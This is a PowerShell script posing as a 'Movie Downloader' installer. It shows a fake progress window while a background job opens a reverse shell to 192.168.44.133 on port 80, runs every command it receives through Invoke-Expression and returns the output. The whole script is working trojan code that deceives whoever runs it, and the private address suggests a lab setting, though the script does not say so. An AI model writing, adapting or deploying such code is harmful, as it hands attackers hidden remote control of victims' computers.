function Invoke-GUI {
    # Init PowerShell Gui
    Add-Type -AssemblyName System.Windows.Forms

    # Create a new form
    $Form = New-Object system.Windows.Forms.Form

    # Define the size, title and background color
    $Form.ClientSize = '500,300'
    $Form.text = "Installation"
    $Form.BackColor = "#ffffff"

    # Create a Title for our form. We will use a label for it.
    $Title = New-Object system.Windows.Forms.Label

    # The content of the label
    $Title.text = "Movie Downloader"

    # Make sure the label is sized the height and length of the content
    $Title.AutoSize = $true

    # Define the minimal width and height (not nessary with autosize true)
    $Title.width = 25
    $Title.height = 10

    # Position the element
    $Title.location = New-Object System.Drawing.Point(20, 20)

    # Define the font type and size
    $Title.Font = 'Microsoft Sans Serif,13'

    # Other elements
    $Description = New-Object system.Windows.Forms.Label
    $Description.text = "Please wait while we download your movie..."
    $Description.AutoSize = $false
    $Description.width = 450
    $Description.height = 50
    $Description.location = New-Object System.Drawing.Point(20, 50)
    $Description.Font = 'Microsoft Sans Serif,10'

    $Status = New-Object system.Windows.Forms.Label
    $Status.text = "Status:"
    $Status.AutoSize = $true
    $Status.location = New-Object System.Drawing.Point(20, 115)
    $Status.Font = 'Microsoft Sans Serif,10,style=Bold'

    $Found = New-Object system.Windows.Forms.Label
    $Found.text = "Downloading..."
    $Found.AutoSize = $true
    $Found.location = New-Object System.Drawing.Point(75, 115)
    $Found.Font = 'Microsoft Sans Serif,10'

    # Add the elements to the form
    $Form.controls.AddRange(@($Title, $Description, $Status, $Found))

    # Display the form
    [void]$Form.ShowDialog()
}

function Invoke-ReverseShell {
    [byte[]]$bytes = 0..65535 | Foreach-Object { 0 }

    $victim = "192.168.44.133"
    $port = 80

    $client = New-Object System.Net.Sockets.TCPClient($victim, $port)

    $stream = $client.GetStream()

    while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)

        $sendback = (Invoke-Expression $data 2>&1 | Out-String)
        $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "

        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)

        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()
    }
    $client.Close()
}

Start-Job -ScriptBlock ${function:Invoke-GUI}
Start-Job -ScriptBlock ${function:Invoke-ReverseShell}